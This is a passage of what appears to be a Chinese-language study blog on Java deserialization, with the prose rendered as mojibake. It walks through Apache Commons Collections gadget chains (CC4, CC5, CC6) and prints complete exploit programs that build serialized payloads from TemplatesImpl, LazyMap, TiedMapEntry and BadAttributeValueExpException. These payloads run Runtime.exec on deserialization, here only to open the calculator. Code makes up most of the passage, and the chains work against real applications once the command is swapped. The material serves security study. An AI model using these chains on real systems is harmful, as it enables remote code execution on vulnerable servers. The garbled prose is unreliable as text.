class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"byc"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span>;</span><br><span class="line"></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"byc404"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections5</li></ul><p>cc5è·Ÿè¿‡ä¸€æ¬¡ã€‚å½“æ—¶æ²¡ç”¨jdk1.7çš„ç¯å¢ƒã€‚ç°åœ¨å®éªŒä¸‹jdk1.7 + cc3ä¾èµ–çš„exp.å¦å¤–å‘ç°è¿™ä¸ªé“¾å­cc3,cc4ä¾èµ–éƒ½å¯ä»¥ä½¿ç”¨ã€‚è²Œä¼¼æ˜¯ysoserialåªå†™äº†cc3çš„é“¾å­ã€‚ç¨å¾®æ”¹ä¸‹å°±å¯ä»¥ç”¨åœ¨cc4çš„ç¯å¢ƒäº†ã€‚</p><p>é¦–å…ˆé‡ç‚¹è¿˜æ˜¯æ„é€ é“¾å­æ¥è°ƒç”¨å–œé—»ä¹è§çš„åå°„transform rce payload.è¿™é‡Œçš„æ–¹æ³•åœ¨ç¬¬ä¸€ç¯‡å­¦ååºåˆ—åŒ–æ—¶å·²ç»è·Ÿè¿‡äº†</p><p>ç„¶åæ˜¯ä¸€ä¸ªç»†èŠ‚ï¼š</p><blockquote><p><code>TransformedMap.decorate()</code>æ–¹æ³•èƒ½å°†æ™®é€šçš„MapAè½¬æ¢ä¸ºTransformedMapBï¼ŒåŒæ—¶å¦‚æœ<code>TransformedMap.decorate()</code>æ–¹æ³•è®¾ç½®äº†ç¬¬äºŒä¸ªå‚æ•°keyTransformeræˆ–è€…ç¬¬ä¸‰ä¸ªå‚æ•°valueTransformerï¼Œå½“TransformedMapBè°ƒç”¨Mapçš„putæ–¹æ³•æˆ–è€…Map.Entryçš„setValueæ–¹æ³•å°±ä¼šè‡ªåŠ¨è§¦å‘åˆšæ‰è®¾ç½®çš„keyTransformeræˆ–è€…valueTransformerç›¸åº”çš„Transformer</p></blockquote><p>ä¹‹æ‰€ä»¥æåˆ°<code>decorate()</code>æ˜¯å› ä¸ºæˆ‘è‡ªå·±è¿™ä¸€éƒ¨åˆ†cc1çš„é“¾å­åœ¨ä¹¦å†™expä¸­ç”¨çš„æ˜¯åå°„å®ä¾‹åŒ–çš„lazymapã€‚å½“æ—¶åªæ˜¯è·Ÿç€åˆ«äººçš„expç”¨åå°„å®ä¾‹åŒ–äº†ï¼Œç»“æœåæ¥å‘ç°æ˜æ˜cc3ä¾èµ–ä¸­ç›´æ¥decorateå°±å¯ä»¥åˆ›å»ºlazymapã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/39.PNG" class="lazyload" data-srcset="39.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™ä¸ªæ–¹æ³•åœ¨cc4ä¾èµ–ä¸­å˜ä¸ºäº†LazpMapæ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/40.PNG" class="lazyload" data-srcset="40.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç„¶åæ ¸å¿ƒè¿˜æ˜¯è·Ÿcc1ä¸€æ ·,æ­¤æ—¶åªè¦ä¸€ä¸ªè°ƒç”¨LazyMap#getçš„ä½ç½®æ¥è§¦å‘rceã€‚</p><p>ç”¨åˆ°çš„gadgetæ˜¯TiedMapEntry#toString =&gt; getValue =&gt; get.éœ€è¦this.mapä¸ºLazyMap.è·Ÿè¿‡ä¸€éå°±ä¸å†è¯´äº†ã€‚</p><p>å†æ¥ä¸‹æ¥æ˜¯BadAttributeValueExpExceptionæ¥è§¦å‘toString.<br>å› ä¸ºå…¶readObjectä¸­<code>valobj.toString</code>çš„valobjæ¥è‡ªè¾“å…¥çš„valã€‚æ‰€ä»¥ç›´æ¥åå°„è®¾ç½®ä¸ºTiedMapEntryå³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(badAttributeValueExpException);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šé¢è¯´äº†ã€‚æ¢æˆcc4ä¾èµ–æ˜¯é€šæ€çš„ã€‚æˆ‘ä»¬åªéœ€å°†expä¸­ä¾èµ–å…¨éƒ¨æ¢æˆ4çš„ï¼Œç„¶ådecorateæ–¹æ³•æ¢æˆlazyMapæ¥å®ä¾‹åŒ–LazyMapå³å¯</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer);</span><br><span class="line">        <span class="comment">//Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(badAttributeValueExpException);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>CommonsCollections6</li></ul><p>æ¯”è¾ƒç±»ä¼¼CC5çš„é“¾å­ã€‚ç„¶ååˆ©ç”¨ç¯å¢ƒä¹Ÿæ˜¯3,4é€šæ€ã€‚</p><p>cc6çš„gadgetä¸cc5çš„åŒºåˆ«åœ¨äºæ²¡æœ‰åˆ©ç”¨TiedMapEntry#toString,è€Œæ˜¯TiedMapEntry#hashCode</p><p>è¿™ä¸ªæ–¹æ³•åœ¨URLDNSä¸­å‡ºç°è¿‡,åœ¨ååºåˆ—åŒ–æ—¶ä¼šé‡æ–°è®¡ç®—å¯¹è±¡çš„ hashCode.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·ŸtoStringä¸€æ ·è°ƒç”¨äº†getValueã€‚æ‰€ä»¥å°±åŸºæœ¬ä¸€æ ·äº†ã€‚</p><p>è§¦å‘hashcodeçš„æ–¹æ³•æ˜¯åˆ©ç”¨Hashmapç±»çš„hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = hashSeed;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != h &amp;&amp; k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">    <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">    <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">    h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ ä¸ŠhashMap.put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ 